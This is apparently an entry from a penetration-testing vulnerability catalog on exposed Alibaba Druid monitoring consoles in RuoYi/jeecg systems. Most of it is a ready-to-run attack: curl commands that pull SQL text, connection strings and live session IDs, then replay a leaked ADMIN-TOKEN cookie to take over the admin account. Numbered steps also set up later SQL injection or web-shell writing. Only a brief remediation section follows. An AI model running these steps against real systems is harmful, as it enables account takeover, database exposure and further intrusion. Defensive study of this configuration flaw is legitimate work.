---
id: "druid-monitor-unauth"
title: "Unauthenticated Druid monitoring → session disclosure/admin takeover (essential for RuoYi-based systems)"
kind: "configuration"
cve: null
related-cves: null
cve-note: "None (configuration flaw)"
severity: "critical"
cvss: 9
severity-basis: "cvss"
severity-note: null
product: "Alibaba Druid connection-pool monitoring (RuoYi/jeecg, etc.)"
versions: "Any"
ports: "80, 443, 8080"
keywords: "druid, monitoring, session, unauthenticated, RuoYi, jeecg"
entry: "/druid/index.html  /druid/websession.html"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (configuration flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /druid/index.html        → 200 (Druid console)
GET /druid/websession.html   → session list
GET /prod-api/druid/index.html → accessible behind the gateway too
```

## Prerequisites

- Druid StatViewServlet is exposed without credentials (or with weak passwords).

## PoC

```bash
# 1) Open the console
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/druid/index.html'

# 2) Fetch SQL monitoring (including real SQL and database connection strings)
curl -s 'https://target/druid/sql.json' | head -c 300

# 3) Fetch Web sessions (session id + user)
curl -s 'https://target/druid/websession.json' | head -c 500
# Result: sessionId/principal returned = administrator session obtainable
```

```bash
# 4) Access the backend directly with the leaked session
curl -s 'https://target/api/user/info' -H 'Cookie: ADMIN-TOKEN=<leaked-value>' | head -c 200
```

## Exploitation Steps

1. First check that `index.html` returns 200;
2. Read `websession.json` to obtain an administrator session (faster than brute forcing);
3. Verify it by calling a backend endpoint with that Cookie;
4. Also read `sql.json` for the database structure, preparing for SQL injection/web-shell writing;
5. Evidence: websession principal (masked) + backend endpoint returning 200.

## Remediation and Mitigation

- Disable StatViewServlet or add credentials + an IP allowlist; `druid.stat-view-servlet.enabled=false`;
- Block `/druid/*` at the gateway.

## References

- Official Druid configuration documentation; RuoYi security-hardening guidance.
